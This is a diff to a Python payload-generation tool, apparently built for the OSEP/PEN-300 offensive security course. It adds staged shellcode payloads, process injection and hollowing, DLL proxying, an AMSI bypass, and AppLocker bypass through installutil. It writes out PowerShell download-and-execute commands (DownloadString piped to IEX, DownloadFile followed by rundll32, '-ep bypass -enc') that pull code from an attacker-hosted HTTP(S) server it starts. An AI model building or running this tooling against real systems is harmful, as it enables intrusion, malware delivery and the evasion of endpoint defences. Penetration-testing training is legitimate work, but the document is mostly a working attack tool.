@@ -12,14 +12,15 @@ input_format = ['', '.exe', '.dll', '.raw', '.bin', '.txt']
 output_format = ['', '.exe', '.dll', '.ps1', '.ps', '.js', '.xml']
 
 def main():
-    parser = argparse.ArgumentParser(description='Tradcraft for Offensive Security PEN-300 (OSEP)', formatter_class=ArgumentFormatter)
+    parser = argparse.ArgumentParser(description='Tradcrafts automation for Offensive Security PEN-300 (OSEP)', formatter_class=ArgumentFormatter)
     
     methods = parser.add_mutually_exclusive_group(required=True)
 
     parser.add_argument('-i', '--input', required=True, help=f'input file format: ({', '.join(input_format[1:])})')
     parser.add_argument('-o', '--output', required=True, help=f'output file format: ({', '.join(output_format[1:])})')
     parser.add_argument('-s', '--server', type=urlparse, help='stage the payload')
-    parser.add_argument('-c', '--command', help=f'command to execute')
+    parser.add_argument('-c', '--class', dest='cls', help='class name (required for .NET DLL)')
+    parser.add_argument('-m', '--method', help='method for DLL. (required for .NET DLL)')
     parser.add_argument('-a', '--args', nargs='+', help='payload arguments')
     
     methods.add_argument('--run', action='store_true', help='shellcode runner {cs, ps1, c}') 
@@ -28,7 +29,7 @@ def main():
     methods.add_argument('--hollow', action='store_true', help='shellcode process hollowing {cs}') 
     parser.add_argument('--process', default='explorer.exe', help='target process')
 
-    methods.add_argument('--proxy', action='store_true', help='dll proxying {c}')
+    parser.add_argument('--proxy', action='store_true', help='dll proxying {c}')
     parser.add_argument('--dll', help='path to the DLL to generate a proxy for')
     parser.add_argument('--dll-path', metavar='PATH', default='C:\\Windows\\System32', help='path to original path')
 
@@ -70,11 +71,24 @@ def main():
 
     if args.reflection and not args.server:
         parser.error('reflection requires server option')
+    
+    if args.server:
+        scheme = args.server.scheme if args.server.scheme in ['http', 'https'] else 'http'
+        hostname = args.server.hostname
+        port = args.server.port if args.server.port else 80 if scheme == 'http' else 443
+        target_path = os.path.basename(target)
+        certfile = os.path.join(rootdir, 'tradecraft/ssl/cert.pem') if scheme == 'https' else None
+        keyfile = os.path.join(rootdir, 'tradecraft/ssl/key.pem') if scheme == 'https' else None
+        httpd = HTTPServer(hostname, port, tempdir.name, certfile, keyfile)
+        url = f'{scheme}://{hostname}:{port}'
 
     if args.inject or args.hollow or args.run:
         if input_ext in ['.exe', '.dll']:
             print_info('Generating shellcode using donut')
             donut = [os.path.join(rootdir, 'tradecraft/bin/donut'), '--input:'+args.input, '--output:'+os.path.join(tempdir.name, 'shellcode.bin')]
+            if output_ext == '.dll' and args.cls and args.methods:
+                donut.append('--class:'+args.cls)
+                donut.append('--method:'+args.methods)
             if args.arch == 'x32':
                 donut.append('--arch:1')
             elif args.arch == 'x64':
@@ -95,6 +109,49 @@ def main():
         with open(input, 'rb') as f:
             shellcode = f.read()
 
+        arch = args.arch.lower().replace('x32', 'x86').replace('any', 'anycpu')
+
+        if args.server:
+            shellcode_target = os.path.splitext(target)[0]+'.bin'
+            cs_target = os.path.splitext(target)[0]+'.cs'
+            binary_target = os.path.splitext(target)[0]+'.exe'
+            code, shellcode = cs.stager(args, f'{url}/{os.path.basename(shellcode_target)}', shellcode)
+            with open(shellcode_target, 'wb') as f:
+               f.write(shellcode)
+            
+            with open(cs_target, 'w') as f:
+               f.write(code)
+            
+            mcs = ['mcs', '-unsafe', '-platform:'+arch, cs_target, '-out:'+binary_target]
+            defines = []
+            if args.encrypt:
+                mcs.append('-define:'+args.encrypt.upper())
+
+            if args.hide:
+                mcs.append('-target:winexe')
+
+            print_info('Building stager payload')
+            build(mcs, args.verbose)
+
+            donut = [os.path.join(rootdir, 'tradecraft/bin/donut'), '--input:'+binary_target, '--output:'+os.path.join(tempdir.name, 'shellcode.bin')]
+            if args.arch == 'x32':
+                donut.append('--arch:1')
+            elif args.arch == 'x64':
+                donut.append('--arch:2')
+            else:
+                donut.append('--arch:3')
+            
+            if not args.amsi:
+                donut.append('--bypass:1')
+            
+            
+                
+            build(donut, args.verbose)
+            print_success('Payload stager generated')
+
+            with open(os.path.join(tempdir.name, 'shellcode.bin'), 'rb') as f:
+                shellcode = f.read()
+
         if output_ext in ['.exe', '.dll']:
             if args.run:
                 print_info('Generating shellcode runner payload')
@@ -112,7 +169,6 @@ def main():
             with open(os.path.join(tempdir.name,'program.cs'), 'w') as f:
                 f.write(code)
             
-            arch = args.arch.lower().replace('x32', 'x86').replace('any', 'anycpu')
             mcs = ['mcs', '-unsafe', '-platform:'+arch, os.path.join(tempdir.name,'program.cs'), '-out:'+target]
             defines = []
             if args.delay:
@@ -147,32 +203,8 @@ def main():
             with open(target, 'w') as f:
                 f.write(code)
             print_success('Payload generated')
-
-    elif args.proxy:
-        dll_code, def_code = c.dll_proxy(args.proxying_dll, args.proxying_path)
-
-        with open(os.path.join(tempdir.name,'proxy.c'), 'w') as f:
-            f.write(dll_code)
-        
-        with open(os.path.join(tempdir.name,'proxy.def'), 'w') as f:
-            f.write(def_code)
-
-        print_info('Generating dll proxying payload')
-
-        mingw = ['x86_64-w64-mingw32-gcc', '-shared', os.path.join(tempdir.name,'proxy.c'), os.path.join(tempdir.name,'proxy.def'), '-o', target]
-        build(mingw, args.verbose)
-        print_success('Payload generated')
     
     if args.server:
-        scheme = args.server.scheme if args.server.scheme in ['http', 'https'] else 'http'
-        hostname = args.server.hostname
-        port = args.server.port if args.server.port else 80 if scheme == 'http' else 443
-        target_path = os.path.basename(target)
-        certfile = os.path.join(rootdir, 'tradecraft/ssl/cert.pem') if scheme == 'https' else None
-        keyfile = os.path.join(rootdir, 'tradecraft/ssl/key.pem') if scheme == 'https' else None
-        httpd = HTTPServer(hostname, port, tempdir.name, certfile, keyfile)
-        url = f'{scheme}://{hostname}:{port}'
-        
         if output_ext in ['.exe', '.dll']:
             if args.applocker:
                 print_info(f'Generating {args.applocker} payload')
@@ -204,7 +236,8 @@ def main():
                         mcs.append('-target:winexe')
                     build(mcs, args.verbose)
                     ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/build{output_ext}","{args.applocker_path}\\build.xml");C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U "{args.applocker_path}\\build.xml"'
-            elif args.reflection:
+            
+            elif args.reflection or args.proxy:
                 print_info('Generating reflection payload')
                 code = ps.assembly_reflection(f'{url}/{target_path}')
                 reflection = os.path.splitext(target)[0] + '.ps1'
@@ -213,8 +246,10 @@ def main():
                 reflection_path = os.path.basename(reflection)
                 ps_command = f'(New-Object System.Net.WebClient).DownloadString("{url}/{reflection_path}") | IEX'
             
-            else:
-                ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{target_path}", "{target_path}"); .\\{target_path}'    
+            elif output_ext == '.exe':
+                ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{target_path}", "{target_path}"); .\\{target_path}'   
+            elif output_ext == '.dll':
+                ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{target_path}", "{target_path}"); rundll32.exe {target_path},run'    
 
         elif output_ext in ['.ps1', '.ps']:
             print_info('Generating powershell payload')
@@ -223,9 +258,26 @@ def main():
         else:
             ps_command = f'(New-Object System.Net.WebClient).DownloadFile("{url}/{target_path}", "{target_path}")'
 
-        print(f'powershell -enc {ps_encode(ps_command)}')
-        httpd.serve_forever()
+        if args.proxy:
+            dll_name = os.path.basename(args.dll)
+            dll_code, def_code = c.dll_proxy(args.dll, args.dll_path, f'cmd.exe /c powershell -ep bypass -enc {ps_encode(ps_command)}')
+
+            with open(os.path.join(tempdir.name,'proxy.c'), 'w') as f:
+                f.write(dll_code)
+            
+            with open(os.path.join(tempdir.name,'proxy.def'), 'w') as f:
+                f.write(def_code)
+
+            print_info('Generating dll proxying payload')
+
+            mingw = ['x86_64-w64-mingw32-gcc', '-shared', os.path.join(tempdir.name,'proxy.c'), os.path.join(tempdir.name,'proxy.def'), '-o', os.path.join(tempdir.name,dll_name)]
+            build(mingw, args.verbose)
+            print_success('Payload generated')
+        else:
+            print(f'powershell.exe -enc {ps_encode(ps_command)}')
+        
         shutil.copy(target, args.output) 
+        httpd.serve_forever()
 
 if __name__ == '__main__':
     try:
@@ -233,3 +285,4 @@ if __name__ == '__main__':
     except Exception as e:
         print_warn('Build failed:')
         print_error(str(e))
+        #raise e
